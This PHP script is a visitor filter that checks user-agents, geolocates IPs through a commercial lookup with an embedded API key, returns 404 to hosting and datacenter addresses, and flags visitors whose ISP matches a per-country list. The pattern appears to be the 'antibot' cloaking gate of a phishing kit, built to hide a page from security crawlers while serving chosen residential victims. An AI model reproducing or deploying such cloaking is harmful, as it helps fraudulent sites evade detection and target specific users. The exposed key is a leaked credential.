<?php
if (session_status() !== PHP_SESSION_ACTIVE) session_start();

require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/functions.php';

$_SESSION['ip'] = $_SESSION['ip'] ?? ($_SERVER['REMOTE_ADDR'] ?? '');
$isPost = ($_SERVER['REQUEST_METHOD'] === 'POST');
$ua     = $_SERVER['HTTP_USER_AGENT'] ?? '';

$mobileTokens = ['Android', 'webOS', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'IEMobile', 'Opera Mini'];
$deskTokens   = array_merge($mobileTokens, ['Windows NT', 'Macintosh', 'Windows', 'Mac']);

$tokens = !empty($only_mobile) ? $mobileTokens : $deskTokens;
$ok = false;
foreach ($tokens as $t) {
    if (stripos($ua, $t) !== false) { $ok = true; break; }
}

if (!$ok) {
    if ($isPost) { return; }
    http_response_code(404);
    exit;
}

if (empty($_SESSION['geo'])) {
    $ctx = stream_context_create(['http' => ['timeout' => 2, 'ignore_errors' => true]]);
    $raw = @file_get_contents(
        "https://pro.ip-api.com/json/" . urlencode($_SESSION['ip'])
        . "?key=LWKtz4EzQwMJRyQ&fields=status,countryCode,isp,mobile,proxy,hosting",
        false, $ctx
    );
    $r = $raw ? json_decode($raw, true) : null;
    if (is_array($r) && ($r['status'] ?? '') === 'success') {
        $_SESSION['geo'] = $r;
    }
}

$geo = $_SESSION['geo'] ?? null;

if ($geo && !empty($geo['hosting']) && empty($geo['mobile'])) {
    if ($isPost) { return; }
    http_response_code(404);
    exit;
}

if (!isset($_SESSION['bot'])) {
    $_SESSION['bot'] = '0';

    $blPath = __DIR__ . '/../bl.txt';
    $bl = is_readable($blPath)
        ? array_flip(array_unique(file($blPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)))
        : [];

    if ($geo && !isset($bl[$_SESSION['ip']])) {
        $cc = $geo['countryCode'] ?? '';
        if (in_array($cc, $wlCountry, true)) {
            $ispsJson = __DIR__ . '/../isps.json';
            $all  = is_readable($ispsJson) ? json_decode((string)file_get_contents($ispsJson), true) : [];
            $isps = $all[$cc]['isps'] ?? [];
            $needle = strtolower($geo['isp'] ?? '');
            foreach ($isps as $isp) {
                if ($needle !== '' && preg_match('/\b' . preg_quote(strtolower($isp), '/') . '\b/', $needle)) {
                    $_SESSION['bot'] = '1';
                    break;
                }
            }
        }
    }
}

$_SESSION['client'] = '1';